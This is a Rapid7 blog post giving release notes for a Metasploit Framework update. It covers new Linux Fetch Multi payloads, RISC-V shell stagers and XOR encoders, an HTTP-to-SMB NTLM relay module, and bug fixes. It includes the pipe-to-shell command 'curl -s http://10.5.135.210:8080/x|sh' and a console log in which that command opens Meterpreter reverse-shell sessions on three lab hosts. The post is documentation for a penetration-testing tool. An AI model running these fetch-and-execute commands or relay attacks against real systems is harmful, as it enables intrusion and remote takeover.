---
schema_version: "1.0.0"
document_id: "2aa81bd0a3900dd5c5f34804dc39c5086a5f011e3882710c66f565e7aed30209"
company_key: "rapid7-inc-common-stock"
company: "Rapid7 Inc."
source_id: "rapid7-inc-common-stock-rss-ea5a9037191f"
canonical_url: "https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-an-http-to-smb-relay-plus-payload-improvements"
published_at: "2026-07-17T19:30:44+00:00"
first_seen_at: "2026-07-20T23:19:41.599179+00:00"
fetched_at: "2026-07-28T21:08:37.946927+00:00"
content_hash: "sha256:264f1fc3e5d9a8fe21e76b3c70c484a27f7dca29162aaf7943f58d3cc638deeb"
---

# Metasploit Wrap Up: An HTTP to SMB relay plus Payload Improvements

## Metasploit Wrap Up Housekeeping


While the Metasploit Framework will be continuing its weekly release cadence, bringing you dear reader our latest content, the Weekly Wrap Up is being shifted to a bi-weekly cadence. The team is planning to use the additional time between posts to record demos of some of the more exciting content. Stay tuned for the next generation of Metasploit Wrap Ups and be sure to subscribe to the[RSS Feed](https://www.rapid7.com/blog/tag/metasploit/rss/) to be alerted when new blogs are released.


## Fetch Multi: Just Fetch and Forget?


Our very own[bwatters-r7](https://github.com/bwatters-r7) continued to enhance our Fetch Payloads implementation. This time adding a new Linux Fetch Multi payload family that supports on-the-fly Linux architecture identification. Standard Fetch payloads produce a command that will download and execute a specific binary payload on a target, but the new Linux Fetch Multi family will report the architecture of the target host when it requests the payload, and the handler will automatically serve the correct elf architecture payload for the given target. It means that if a user is exploiting a Linux host, they do not need to guess the target’s architecture when selecting a payload. It also means that one payload and one handler can serve across multiple targets of differing architectures. Since these payloads work by adding a query string, only HTTP and HTTPS-based fetch payloads support Fetch Multi payloads.


Here is an example of the same payload and handler identifying and delivering the proper elf architecture payloads to a mipsel host, a mips64 host, and an aarch64 host by just executing the command curl -s http://10.5.135.210:8080/x|sh


on each target.


```text
msf payload(cmd/linux/http/multi/meterpreter_reverse_tcp) > show options
Module options (payload/cmd/linux/http/multi/meterpreter_reverse_tcp):
Name            Current Setting  Required  Description
----            ---------------  --------  -----------
FETCH_COMMAND   CURL             yes       Command to fetch payload (Accepted: CURL, FTP, GET, TFTP, TNFTP,
WGET)
FETCH_DELETE    false            yes       Attempt to delete the binary after execution
FETCH_FILELESS  none             yes       Attempt to run payload without touching disk by using anonymous
handles, requires Linux ≥3.17 (for Python variant also Python ≥3
.8, tested shells are sh, bash, zsh) (Accepted: none, python3.8+
, shell-search, shell)
FETCH_SRVHOST                    no        Local IP to use for serving payload
FETCH_SRVPORT   8080             yes       Local port to use for serving payload
FETCH_URIPATH   x                no        Local URI to use for serving payload
LHOST           10.5.135.210     yes       The listen address (an interface may be specified)
LPORT           4444             yes       The listen port
When FETCH_COMMAND is one of CURL,GET,WGET:
Name        Current Setting  Required  Description
----        ---------------  --------  -----------
FETCH_PIPE  true             yes       Host both the binary payload and the command so it can be piped dire
ctly to the shell.
When FETCH_FILELESS is none:
Name                Current Setting  Required  Description
----                ---------------  --------  -----------
FETCH_FILENAME      cldOGvRDplZ      no        Name to use on remote system when storing payload; cannot co
ntain spaces or slashes
FETCH_WRITABLE_DIR  ./               yes       Remote writable dir to store payload; cannot contain spaces
View the full module info with the info, or info -d command.
msf payload(cmd/linux/http/multi/meterpreter_reverse_tcp) > to_handler
[*] Command to execute on target: curl -s http://10.5.135.210:8080/x|sh
[*] Payload Handler Started as Job 0
[*] Fetch handler listening on 10.5.135.210:8080
[*] HTTP server started
[*] Adding resource /csmCra8lnQTHxFXkipQC0w
[*] Adding resource /x
[*] Started reverse TCP handler on 10.5.135.210:4444
msf payload(cmd/linux/http/multi/meterpreter_reverse_tcp) > [*] Client 10.5.132.212 requested /x
[*] Sending payload to 10.5.132.212 (curl/8.13.0-rc3)
[*] Client 10.5.132.212 requested /csmCra8lnQTHxFXkipQC0w?arch=armv7l
[*] Sending payload to 10.5.132.212 (curl/8.13.0-rc3)
[*] Dynamic Payload Detected, expecting a Query String in the request...
[*] Building payload for armle arch
[*] Meterpreter session 1 opened (10.5.135.210:4444 -> 10.5.132.212:45068) at 2026-07-14 11:33:18 -0500
[*] Client 10.5.132.214 requested /x
[*] Sending payload to 10.5.132.214 (curl/8.11.0)
[*] Client 10.5.132.214 requested /csmCra8lnQTHxFXkipQC0w?arch=aarch64
[*] Sending payload to 10.5.132.214 (curl/8.11.0)
[*] Dynamic Payload Detected, expecting a Query String in the request...
[*] Building payload for aarch64 arch
[*] Meterpreter session 2 opened (10.5.135.210:4444 -> 10.5.132.214:39894) at 2026-07-14 11:33:26 -0500
[*] Client 10.5.132.224 requested /x
[*] Sending payload to 10.5.132.224 (curl/7.52.1)
[*] Client 10.5.132.224 requested /csmCra8lnQTHxFXkipQC0w?arch=mips64
[*] Sending payload to 10.5.132.224 (curl/7.52.1)
[*] Dynamic Payload Detected, expecting a Query String in the request...
[*] Building payload for mips64 arch
[*] Meterpreter session 3 opened (10.5.135.210:4444 -> 10.5.132.224:53506) at 2026-07-14 11:33:41 -0500
msf payload(cmd/linux/http/multi/meterpreter_reverse_tcp) > sessions -C sysinfo
[*] Running 'sysinfo' on meterpreter session 1 (10.5.132.212)
Computer     : kali-raspberrypi
OS           : Debian  (Linux 5.15.44-Re4son-v7+)
Architecture : armv7l
BuildTuple   : armv5l-linux-musleabi
Meterpreter  : cmd/linux
[*] Running 'sysinfo' on meterpreter session 2 (10.5.132.214)
Computer     : kali-raspberrypi
OS           : Debian  (Linux 5.15.44-Re4son-v8l+)
Architecture : aarch64
BuildTuple   : aarch64-linux-musl
Meterpreter  : cmd/linux
[*] Running 'sysinfo' on meterpreter session 3 (10.5.132.224)
Computer     : ubnt
OS           : Debian 9.13 (Linux 4.9.79-UBNT)
Architecture : mips64
BuildTuple   : mips64-linux-muslsf
Meterpreter  : cmd/linux
msf payload(cmd/linux/http/multi/meterpreter_reverse_tcp) >
```


## RISC architecture is going to change everything!


Speaking of juggling multiple architectures,[bcoles](https://github.com/bcoles) added support for yet another IoT arch: RiscV. The change adds staged and stageless shell payloads for both 32- and 64-bit RiscV systems, and dovetails well with his other PR adding XOR encoders for RiscV payloads.


## New module content (4)


### Microsoft Windows HTTP to SMB Relay


Author: jheysel-r7


Type: Auxiliary


Pull request:[#21620](https://github.com/rapid7/metasploit-framework/pull/21620) contributed by[jheysel-r7](https://github.com/jheysel-r7)


Path: server/relay/http_to_smb


Description: Adds an HTTP to SMB Relay server module allowing users to relay an incoming NTLM HTTP authentication request to multiple SMB servers in order to establish SMB session on the target hosts to be used by the framework.


### Byte XORi Encoder


Author: bcoles[\[email protected\]](https://www.rapid7.com/cdn-cgi/l/email-protection#fa989995969f89ba9d979b9396d4999597)


Type: Encoder


Pull request:[#21235](https://github.com/rapid7/metasploit-framework/pull/21235) contributed by[bcoles](https://github.com/bcoles)


Paths:


- encoders/riscv32le/byte_xori


- encoders/riscv32le/longxor


- encoders/riscv32le/longxor_feedback


- encoders/riscv32le/longxor_tag


- encoders/riscv64le/byte_xori


- encoders/riscv64le/longxor


- encoders/riscv64le/longxor_feedback


- encoders/riscv64le/longxor_tag


Description: Add four encoder variants for both RISC-V 32-bit and 64-bit little-endian architectures.


### FTP, HTTP, HTTPS and METERPRETER_REVERSE_TCP Fetch, Linux Chmod


Authors: Brendan Watters, Spencer McIntyre, and bcoles[\[email protected\]](https://www.rapid7.com/cdn-cgi/l/email-protection#5436373b383127143339353d387a373b39)


Type: Payload (Adapter)


Pull request:[#21384](https://github.com/rapid7/metasploit-framework/pull/21384) contributed by[bwatters-r7](https://github.com/bwatters-r7)


Description: Adds Linux fetch multi payloads, a fetch server for FTP-based fetch payloads, a TFTP server to rex/proto to align with our other servers.


This adapter adds 421 new payloads for all Linux and Windows architectures including:


- cmd/linux/ftp/aarch64/chmod
- cmd/linux/ftp/x86/meterpreter/reverse_tcp
- cmd/windows/ftp/aarch64/meterpreter_reverse_http


### FTP Fetch, Linux dup2 Command Shell, Bind TCP Stager


Authors: Brendan Watters, Spencer McIntyre, and bcoles[\[email protected\]](https://www.rapid7.com/cdn-cgi/l/email-protection#c4a6a7aba8a1b784a3a9a5ada8eaa7aba9)


Type: Payload (Stager)


Pull request:[#21237](https://github.com/rapid7/metasploit-framework/pull/21237) contributed by[bcoles](https://github.com/bcoles)


Description: Adds reverse_tcp and bind_tcp stagers and a shell command stage for both RISC-V 64-bit and 32-bit little-endian Linux targets.


- cmd/linux/ftp/riscv32le/shell/bind_tcp
- cmd/linux/http/riscv32le/shell/bind_tcp
- cmd/linux/https/riscv32le/shell/bind_tcp
- cmd/linux/tftp/riscv32le/shell/bind_tcp
- linux/riscv32le/shell/bind_tcp
- cmd/linux/ftp/riscv32le/shell/reverse_tcp
- cmd/linux/http/riscv32le/shell/reverse_tcp
- cmd/linux/https/riscv32le/shell/reverse_tcp
- cmd/linux/tftp/riscv32le/shell/reverse_tcp
- linux/riscv32le/shell/reverse_tcp
- cmd/linux/ftp/riscv64le/shell/bind_tcp
- cmd/linux/http/riscv64le/shell/bind_tcp
- cmd/linux/https/riscv64le/shell/bind_tcp
- cmd/linux/tftp/riscv64le/shell/bind_tcp
- linux/riscv64le/shell/bind_tcp
- cmd/linux/ftp/riscv64le/shell/reverse_tcp
- cmd/linux/http/riscv64le/shell/reverse_tcp
- cmd/linux/https/riscv64le/shell/reverse_tcp
- cmd/linux/tftp/riscv64le/shell/reverse_tcp
- linux/riscv64le/shell/reverse_tcp


## Enhancements and features (4)


- [#21235](https://github.com/rapid7/metasploit-framework/pull/21235) from[bcoles](https://github.com/bcoles) - Add four encoder variants for both RISC-V 32-bit and 64-bit little-endian architectures.
- [#21384](https://github.com/rapid7/metasploit-framework/pull/21384) from[bwatters-r7](https://github.com/bwatters-r7) - Adds Linux fetch multi payloads, a fetch server for FTP-based fetch payloads, a TFTP server to rex/proto to align with our other servers.
- [#21599](https://github.com/rapid7/metasploit-framework/pull/21599) from[Pushpenderrathore](https://github.com/Pushpenderrathore) - This extends CertificateTrace functionality to also surface the server's TLS peer certificate when an HTTP module connects over HTTPS. This makes use of the same CertificateTrace enum (off/metadata/full) operators are already familiar with.
- [#21602](https://github.com/rapid7/metasploit-framework/pull/21602) from[zeroSteiner](https://github.com/zeroSteiner) - Updates the Windows service PE template to use an injected segment instead of the old substitution method.


## Bugs fixed (4)


- [#21621](https://github.com/rapid7/metasploit-framework/pull/21621) from[eipoverflow](https://github.com/eipoverflow) - This fix a limitation on running fileless staged Meterpreter in recent OSX versions.
- [#21670](https://github.com/rapid7/metasploit-framework/pull/21670) from[zeroSteiner](https://github.com/zeroSteiner) - Marks the dynamic XOR encoders as unable to preserve registers and adds regression coverage for stage encoding when a preserved register is required.
- [#21675](https://github.com/rapid7/metasploit-framework/pull/21675) from[sjanusz-r7](https://github.com/sjanusz-r7) - Fix search_cache job cache generation by skipping multi arch payloads.
- [#21677](https://github.com/rapid7/metasploit-framework/pull/21677) from[bwatters-r7](https://github.com/bwatters-r7) - Fixes a bug in the HTTP relay server mixin where requests matching the module's URIPATH were silently dropped instead of being relayed The fix removes the now-unnecessary URIPATH option, ensures all requests are properly relayed, and adds spec tests to cover the fix.


## Documentation


You can find the latest Metasploit documentation on our docsite at[docs.metasploit.com](https://docs.metasploit.com/) .


## Get it


As always, you can update to the latest Metasploit Framework with msfupdate and you can get more details on the changes since the last blog post from GitHub:


- [Pull Requests 6.4.143...6.4.144](https://github.com/rapid7/metasploit-framework/pulls?q=is:pr+merged:%222026-07-08T13%3A32%3A18-07%3A00..2026-07-15T15%3A48%3A48-07%3A00%22)
- [Full diff 6.4.143...6.4.144](https://github.com/rapid7/metasploit-framework/compare/6.4.143...6.4.144)


If you are a git user, you can clone the[Metasploit Framework repo](https://github.com/rapid7/metasploit-framework) (master branch) for the latest. To install fresh without using git, you can use the open-source-only[Nightly Installers](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers) or the commercial edition[Metasploit Pro](https://www.rapid7.com/products/metasploit/download/)
